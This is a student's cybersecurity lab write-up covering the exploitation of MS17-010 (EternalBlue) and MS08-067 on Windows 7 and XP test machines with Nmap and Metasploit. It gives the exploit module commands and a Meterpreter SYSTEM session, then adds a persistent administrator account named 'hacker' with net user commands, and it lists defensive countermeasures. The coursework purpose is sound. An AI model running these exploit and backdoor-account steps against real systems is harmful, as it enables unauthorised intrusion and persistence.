#  Lab — Vulnerability Assessment & Exploitation

> **Disclaimer:** All tasks were performed exclusively in an isolated VirtualBox lab environment
> (Host-Only network). No real systems were targeted. This is academic coursework documentation.

---

## Lab Overview

| Detail | Info |
|--------|------|
| Environment | VirtualBox — Host-Only Network |
| Attacker Machine | Kali Linux |
| Target 1 | Windows 7 (192.168.1.14) |
| Target 2 | Windows XP (192.168.1.13) |
| Tools Used | Nmap, Metasploit Framework |

---

## Task 1 — MS17-010 (EternalBlue) on Windows 7

### Step 1: Port Discovery
Performed a full port scan to identify open services on the target.

```bash
nmap -p- 192.168.1.14
```

**Finding:** Port `445/tcp` (microsoft-ds / SMB) was open — the attack surface for MS17-010.

---

### Step 2: Vulnerability Verification
Used Nmap's built-in vulnerability scripts to confirm the SMB vulnerability.

```bash
nmap --script vuln 192.168.1.14 -p 445
```

**Result:**
- `smb-vuln-ms17-010: VULNERABLE`
- CVE: `CVE-2017-0143`
- Risk Factor: **HIGH**
- Remote Code Execution via SMBv1 confirmed

---

### Step 3: Exploitation via Metasploit
Loaded the EternalBlue exploit module and configured target options.

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.14
set LHOST 192.168.1.12
set LPORT 4444
show options
```

**Outcome:** System confirmed vulnerable. Exploitation module configured successfully.

---

### Concepts Learned
- SMB protocol vulnerability identification
- CVE research and validation using Nmap NSE scripts
- Metasploit module selection and configuration
- Why unpatched legacy OS (Windows 7) is a critical security risk

### Defensive Countermeasures
- Disable SMBv1 protocol
- Apply Microsoft patch MS17-010 immediately
- Block port 445 at network perimeter
- Upgrade end-of-life operating systems

---

## Task 2 — MS08-067 on Windows XP + Privilege Escalation

### Step 1: Aggressive Scan + Vulnerability Detection
Used aggressive scan with OS detection and vulnerability scripts simultaneously.

```bash
nmap -sV -O -A 192.168.1.13 --script vuln
```

**Result:**
- `smb-vuln-ms08-067: VULNERABLE`
- CVE: `CVE-2008-4250`
- Affected: Windows XP SP2/SP3, Server 2003
- Vector: Crafted RPC request → stack overflow → Remote Code Execution

---

### Step 2: Metasploit Exploitation
Searched and loaded the appropriate exploit module.

```bash
msf > search ms08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.13
run
```

**Session Result:** Meterpreter session established.

---

### Step 3: Privilege Verification
Confirmed system-level access after successful exploitation.

```bash
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

**NT AUTHORITY\SYSTEM** = highest privilege level on Windows.

---

### Step 4: Post-Exploitation — Account Creation & Privilege Escalation
Demonstrated persistence technique by creating an admin-level account.

```bash
net user hacker 123 /add
net localgroup administrators hacker /add
net user hacker
```

**Result:** New user `hacker` created with `*Administrators` group membership confirmed.

---

### Concepts Learned
- Aggressive Nmap scanning (-sV, -O, -A flags combined)
- CVE-2008-4250 exploitation via NetAPI vulnerability
- Meterpreter session management
- Post-exploitation: user creation and privilege escalation
- Understanding NT AUTHORITY\SYSTEM privilege level

### Defensive Countermeasures
- Apply MS08-067 security patch
- Disable NetBIOS and SMB where not required
- Implement least privilege principle
- Monitor for unauthorized user account creation
- Use EDR/SIEM to detect Meterpreter signatures

---

## Skills Demonstrated

| Skill | Tool/Technique |
|-------|---------------|
| Network Enumeration | Nmap -p-, -sV, -O, -A |
| Vulnerability Scanning | Nmap --script vuln |
| CVE Research | MS17-010, MS08-067 |
| Exploitation | Metasploit Framework |
| Post-Exploitation | Meterpreter, net user |
| Privilege Escalation | Admin group assignment |
| Documentation | Professional PDF reporting |

---

## Tools Reference

- **Nmap 7.98** — Network scanner and vulnerability checker
- **Metasploit Framework** — Exploitation and post-exploitation platform
- **Meterpreter** — Advanced post-exploitation payload
- **Kali Linux** — Primary attack platform

---

*Academic Lab | Cybersecurity Course — Week 4 | Muhammad Adeel Tariq*
